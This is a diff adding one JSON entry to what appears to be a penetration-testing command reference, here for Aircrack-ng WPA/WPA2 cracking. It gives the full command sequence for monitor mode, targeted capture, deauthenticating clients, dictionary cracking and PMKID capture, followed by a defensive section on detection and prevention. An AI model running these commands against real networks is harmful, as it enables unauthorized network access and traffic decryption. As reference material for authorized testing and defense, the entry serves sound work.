@@ -1,0 +1,82 @@
+{
+  "id": "wifi-aircrack-ng",
+  "name": "Aircrack-ng - WPA/WPA2 Handshake Cracking",
+  "command": "aircrack-ng -w <wordlist> -b <target> <file>",
+  "description": "The Aircrack-ng suite captures and cracks Wi-Fi. airmon-ng enables monitor mode, airodump-ng scans and captures the WPA/WPA2 4-way handshake (or PMKID), aireplay-ng deauthenticates clients to force a handshake, and aircrack-ng runs a dictionary attack against the captured handshake to recover the passphrase.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Wireless Security",
+  "subcategory": "WPA Cracking",
+  "certifications": [],
+  "primary_cert": "",
+  "source": "aircrack-ng/aircrack-ng",
+  "tags": [
+    "aircrack-ng",
+    "wireless",
+    "wifi",
+    "wpa2",
+    "handshake",
+    "deauth",
+    "cracking"
+  ],
+  "mitre": [
+    "T1040",
+    "T1110.002"
+  ],
+  "exam": "lab-only",
+  "notes": "=== MONITOR MODE ===\n  airmon-ng check kill\n  airmon-ng start <interface>        # -> <interface>mon (e.g. wlan0mon)\n\n=== SCAN ===\n  airodump-ng <interface>mon         # list APs: BSSID, CH, ESSID, clients\n\n=== TARGETED CAPTURE (lock to channel + write pcap) ===\n  airodump-ng -c <ch> --bssid <target> -w cap <interface>mon\n  # wait for 'WPA handshake: <BSSID>' in the top-right\n\n=== FORCE A HANDSHAKE (deauth a client) ===\n  aireplay-ng -0 5 -a <target> -c <client_mac> <interface>mon\n\n=== CRACK ===\n  aircrack-ng -w <wordlist> -b <target> cap-01.cap\n  # or convert + GPU crack with hashcat (mode 22000)\n\n=== PMKID (clientless) ===\n  hcxdumptool / hcxpcapngtool -> hashcat -m 22000\n\n=== ALTERNATIVES ===\n  wifite       # automates the whole flow\n  hashcat -m 22000   # GPU cracking of the handshake/PMKID\n  hcxdumptool  # PMKID capture",
+  "examples": [
+    {
+      "label": "Start monitor mode",
+      "command": "airmon-ng start <interface>"
+    },
+    {
+      "label": "Capture handshake on a target",
+      "command": "airodump-ng -c <port> --bssid <target> -w cap <interface>mon"
+    },
+    {
+      "label": "Crack the handshake",
+      "command": "aircrack-ng -w <wordlist> -b <target> cap-01.cap"
+    }
+  ],
+  "references": [
+    {
+      "title": "Aircrack-ng",
+      "url": "https://www.aircrack-ng.org/"
+    },
+    {
+      "title": "Aircrack-ng GitHub",
+      "url": "https://github.com/aircrack-ng/aircrack-ng"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "wifi-wifite",
+      "note": "wifite automates capture + crack end to end.",
+      "rel": "alternative"
+    },
+    {
+      "id": "wifi-hcxdumptool",
+      "note": "hcxdumptool for clientless PMKID capture.",
+      "rel": "next"
+    },
+    {
+      "id": "hashcat-dictionary",
+      "note": "Crack the converted handshake on GPU (mode 22000).",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "WPA2-PSK authentication derives keys from the passphrase; the 4-way handshake (or a PMKID) lets an attacker brute-force that passphrase offline. Deauthentication frames (unprotected in WPA2) force clients to reconnect and expose the handshake.",
+    "prerequisites": "A wireless adapter supporting monitor mode and injection, within RF range of the target network.",
+    "impact": "Recovery of the Wi-Fi passphrase, granting full network access and the ability to decrypt captured traffic.",
+    "detection": "[MITRE T1040] WIDS/WIPS alerts on deauthentication floods and monitor-mode/rogue adapters; spikes of 802.11 deauth/disassoc frames; clients repeatedly reassociating.",
+    "artifacts": "Wireless controller/WIDS logs (deauth flood, unknown MACs), repeated client disconnect/reconnect events, management-frame anomalies.",
+    "prevention": "Use WPA3-SAE (resists offline cracking) or long random WPA2 passphrases (20+ chars); enable 802.11w Protected Management Frames to block deauth; WPA2-Enterprise (EAP) instead of PSK; deploy WIPS to detect deauth/rogue APs; segment and monitor wireless.",
+    "sources": [
+      "aircrack-ng/aircrack-ng",
+      "https://www.aircrack-ng.org/"
+    ]
+  }
+}
